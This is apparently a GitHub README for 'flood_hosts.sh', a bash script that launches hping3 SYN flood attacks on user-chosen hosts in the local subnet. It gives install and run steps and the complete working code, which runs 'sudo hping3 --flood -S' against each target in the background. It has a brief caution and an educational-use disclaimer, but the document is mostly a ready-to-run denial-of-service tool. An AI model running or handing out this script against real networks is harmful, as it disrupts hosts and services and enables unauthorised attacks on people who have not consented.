# 🦠 Flood Hosts Script

This script is a powerful tool to perform SYN flood attacks on specified target hosts within your local network. Leveraging `hping3` for the flood attack and `ipcalc` to ensure target IPs are valid, it gives you a glimpse into the world of network testing.

## 🛠️ Prerequisites

Before running this script, ensure you have the following installed on your system:

- `hping3` 📡
- `ipcalc` 🔍

Install these tools using your package manager. For example, on Ubuntu:

```sh
sudo apt-get install hping3 ipcalc
```

## 🚀 Usage

1. Save the script to a file, for example, `flood_hosts.sh`.
2. Make the script executable:

```sh
chmod +x flood_hosts.sh
```

3. Run the script:

```sh
./flood_hosts.sh
```

## 💻 Script Details

### Description

This script performs the following steps:

1. **Get Local Network Information** 🌐:
    - Retrieves the local IP address and determines the subnet (assuming a /24 subnet).

2. **Prompt for Target Hosts** 🎯:
    - Asks the user to enter the target IP addresses separated by spaces.

3. **Validate and Attack** ⚔️:
    - For each entered IP address, the script checks if the IP is within the local subnet.
    - If the IP is valid, it initiates a SYN flood attack using `hping3` and logs the output to a file named after the target IP.
    - If the IP is not within the local network, it notifies the user.

4. **Wait for Attacks to Complete** ⏳:
    - The script waits for all initiated attacks to complete before exiting.

### Code

```sh
#!/bin/bash

# Function to get the local network and subnet
get_local_network_info() {
    local_ip=$(ip -4 addr show scope global | grep inet | awk '{print $2}' | head -n 1)
    subnet="${local_ip%.*}.0/24"  # Assuming a /24 subnet
    echo "$subnet"
}

# Get the local network information
network_info=$(get_local_network_info)
echo "Local network info: $network_info"

# Prompt the user to enter target hosts
echo "Enter target hosts separated by spaces:"
read -a IPs

pids=()  # Array to hold PIDs of background processes

for IP in "${IPs[@]}"
do
    ip_to_check=$IP

    # Check if the IP is within the local network
    if ipcalc -n $network_info | grep -q "${ip_to_check%.*}.0"; then
        log_file="${IP}_attack.log"
        echo "Starting attack on $IP. Logging to $log_file."
        
        echo "Sending SYN packets to $IP from $network_info"
        sudo hping3 -V --flood -S "$IP" &> "$log_file" &
        pids+=($!)  # Capture the PID of the background process
        echo "Attack on $IP initiated. Check $log_file for details."
    else
        echo "$ip_to_check is NOT in the local network."
    fi
done

# Wait for all background processes to finish
for pid in "${pids[@]}"
do
    wait "$pid"
done

echo "All attacks completed."
```

## ⚠️ Important Notes

- **Caution**: SYN flood attacks can cause network disruptions and are considered malicious activity. Use this script responsibly and only in environments where you have explicit permission to perform such actions.
- **Permissions**: The script uses `sudo` to run `hping3`. Ensure you have the necessary permissions to execute commands with `sudo`.
- **Logging**: Each attack's output is logged to a file named after the target IP address, e.g., `192.168.1.1_attack.log`.

## 📝 Disclaimer

This script is provided for educational purposes only. The author is not responsible for any misuse or damage caused by using this script.

---

## 🛡️ License

This project is licensed under the [MIT License](LICENSE).

---

## 📞 Contact

For support or questions, feel free to reach out:

- **GitHub Profile**: [yourusername](https://github.com/yourusername)
- **Email**: your.email@example.com

---
